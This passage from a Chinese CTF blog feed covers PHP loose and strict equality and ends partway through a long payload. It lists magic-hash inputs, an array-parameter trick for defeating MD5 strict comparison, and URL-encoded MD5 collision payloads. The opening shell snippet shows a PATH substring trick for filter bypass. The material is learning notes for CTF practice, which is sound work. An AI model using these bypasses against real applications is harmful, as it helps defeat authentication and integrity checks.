hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ `$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>&quot;hello.txt&quot;:1: bad minute<br>errors in crontab file, can&#x27;t install.<br><br>注意不要少了echo!<br></code></pre></td></tr></table></figure><p>以上内容参考了这些师傅们的文章，感谢：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_53142368/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">116152477</span><br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">391439312</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_45836474/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">107248010</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net/qq_51295677?type=blog<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP中的弱相等和强相等</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/</url>
    
    <content type="html"><![CDATA[<p>入门级理解，没啥含金量:)</p><span id="more"></span><hr><p>本人的一点拙见。</p><p>先看下GPT对弱相等和强相等的解释：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">在PHP中，弱相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span>）和强相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>）是用于比较两个值的操作符，它们有以下区别：<br><br>    <span class="hljs-number">1</span>.弱相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span>）：弱相等用于比较两个值是否相等，不考虑值的数据类型。如果两个值在转换后相等，则返回true，否则返回false。弱相等会自动进行类型转换，例如将字符串转换为数字进行比较。<br><br>    <span class="hljs-number">2</span>.强相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>）：强相等用于比较两个值是否相等，且要求两个值的数据类型也相同。除了比较值是否相等外，还要求比较的两个值的数据类型也相同。如果值和数据类型都相等，则返回true，否则返回false。强相等不会进行自动类型转换<br></code></pre></td></tr></table></figure><p>在弱相等比较中，<code>不考虑数据类型</code>，<code>转换后</code>相等返回<code>true</code>,否则返回<code>false</code>。所以整型、浮点型、字符串、布尔型等均可比较，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//字符串和整型或浮点型比较，字符串若以数字开头则从开头截取到字母出现的位置：</span><br><span class="hljs-string">&#x27;111&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111abc&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111admin&#x27;</span> == <span class="hljs-number">111.000000</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;notbad3333&#x27;</span> == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br><span class="hljs-comment">//布尔型与字符串和整型及浮点型均可相互比较：</span><br>True == <span class="hljs-string">&#x27;hello world!&#x27;</span><span class="hljs-comment">//True</span><br>True == <span class="hljs-string">&#x27;123abc&#x27;</span> <span class="hljs-comment">//True,字符串里面只要不是单个0，任何组合(哪怕是0.0)都与True弱相等</span><br>True ==<span class="hljs-string">&#x27;0.0000&#x27;</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0.0</span> <span class="hljs-comment">//True,0.0000等同理</span><br>False == <span class="hljs-literal">null</span> <span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">//True</span><br>False ==<br><span class="hljs-comment">//科学计数法的相关比较,并拓展到MD5加密比较</span><br><span class="hljs-number">0e333</span> == <span class="hljs-string">&#x27;0e111&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;0e321&#x27;</span>==<span class="hljs-string">&#x27;0e789&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-comment">//比如两个东西加密后均以0e开头，那他们就是弱相等的</span><br><span class="hljs-comment">//拓展到is_numeric的绕过，很经典的是让你输入一个东西(GET或POST传，这个东西不能是数字却要大于或小于或等于某个特定的数字)</span><br> <span class="hljs-comment">//注意虽然`0==null==false`成立，但不能因为`&#x27;notbad3333&#x27; == 0`就推出`&#x27;notbad3333&#x27; == null/false`!</span><br></code></pre></td></tr></table></figure><p>在强相等中，不光要求值相等类型还要相等。如果想要绕过两个md5的强相等：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//数组法</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;oh you find me!&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//可用GET传?a[]=a&amp;b[]=b，MD5没法给数组加密会返回null(报错)，但这时两个null满足了强相等。</span><br><span class="hljs-comment">//碰撞法:MD5被认为是不安全的，利用现有的MD5的强碰撞解题</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//一些比较常用的MD5弱比较：</span><br>QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><span class="hljs-number">240610708</span><br><span class="hljs-number">0e462097431906509019562988736854</span><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><span class="hljs-comment">//MD5硬碰撞</span><br>a=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;b=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;c=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%ed%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%a7%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%e6%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">16</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span 